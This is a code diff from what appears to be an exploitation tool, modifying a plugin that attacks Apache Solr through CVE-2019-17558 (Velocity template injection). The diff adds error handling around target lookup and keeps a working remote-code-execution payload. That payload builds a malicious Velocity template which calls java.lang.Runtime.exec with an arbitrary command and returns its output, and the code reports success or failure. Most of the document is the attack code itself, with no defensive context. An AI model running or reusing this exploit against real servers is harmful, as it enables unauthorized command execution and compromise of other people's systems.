@@ -30,7 +30,11 @@ class run(object):
         """
         self.targetAddr = targetAddr
         self.targetAddr = self.targetAddr + "/solr/admin/cores?wt=json&indexInfo=false"
-        conn = requests.request("GET", url=self.targetAddr)
+        try:
+            conn = requests.request("GET", url=self.targetAddr)
+        except requests.exceptions.RequestException as e:
+            data = '{},地址无法访问!'.format(self.targetAddr)
+            return {'status': 20000, 'data': data, 'type': 'status'}
         self.name_payload = "test"
         try:
             self.name_payload = list(json.loads(conn.text)["status"])[1]
@@ -73,25 +77,29 @@ class run(object):
 
         if payload == 'CVE_2019_17558_Apache_Solr_Velocity':
             self.name_payload = run.getname(self, targetAddr)
-            run.Modifyconf(self, targetAddr, self.name_payload)
-
-            targetAddr = targetAddr +"/solr/" + self.name_payload + "/select?q=1&&wt=velocity&" \
-                                                   "v.template=custom&v.template.custom=%23set($x=%27%27)+%23" \
-                                                   "set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23" \
-                                                   "set($chr=$x.class.forName(%27java.lang.Character%27))+%23" \
-                                                   "set($str=$x.class.forName(%27java.lang.String%27))+%23" \
-                                                   "set($ex=$rt.getRuntime().exec(%27" + command + "%27))+$ex.waitFor()+%23" \
-                                                    "set($out=$ex.getInputStream())+%23" \
-                                                    "foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
-            try:
-                conn = requests.request("GET", targetAddr)
-                print("response:" + conn.text)
-            except:
-                command_data = '[-] Command Failed {}'.format(self.currentTime)
-                return {'status': 20001, 'data': command_data, 'type': 'status'}
+            print(self.name_payload)
+            if 20000 in self.name_payload.values():
+                print(self.name_payload)
+                return self.name_payload
             else:
-                command_data = '[+] Command Successfull {}'.format(self.currentTime)
-                return {'status': 20000, 'data': command_data, 'type': 'status'}
+                run.Modifyconf(self, targetAddr, self.name_payload)
+                targetAddr = targetAddr +"/solr/" + self.name_payload + "/select?q=1&&wt=velocity&" \
+                                                       "v.template=custom&v.template.custom=%23set($x=%27%27)+%23" \
+                                                       "set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23" \
+                                                       "set($chr=$x.class.forName(%27java.lang.Character%27))+%23" \
+                                                       "set($str=$x.class.forName(%27java.lang.String%27))+%23" \
+                                                       "set($ex=$rt.getRuntime().exec(%27" + command + "%27))+$ex.waitFor()+%23" \
+                                                        "set($out=$ex.getInputStream())+%23" \
+                                                        "foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
+                try:
+                    conn = requests.request("GET", targetAddr)
+                    print("response:" + conn.text)
+                except:
+                    command_data = '[-] Command Failed {}'.format(self.currentTime)
+                    return {'status': 20001, 'data': command_data, 'type': 'status'}
+                else:
+                    command_data = '[+] Command Successfull {}'.format(self.currentTime)
+                    return {'status': 20000, 'data': command_data, 'type': 'status'}
         else:
             data = '您的输入有误,或者没有加HTTPS请求头!'
             return {'status': 20001, 'data': data, 'type': 'status'}
